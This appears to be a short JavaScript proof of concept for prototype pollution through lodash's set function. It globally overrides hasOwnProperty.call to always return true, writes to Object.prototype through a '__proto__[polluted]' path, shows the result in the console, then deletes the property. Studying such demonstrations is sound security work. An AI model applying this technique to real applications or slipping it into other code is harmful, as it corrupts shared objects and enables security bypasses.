Object.prototype.hasOwnProperty.call = () => true;
const lod = require('lodash');
let obj = {};
console.log({}.polluted);
lod.set(obj, '__proto__[polluted]', 'yes');
console.log({}.polluted);
delete obj.__proto__.polluted;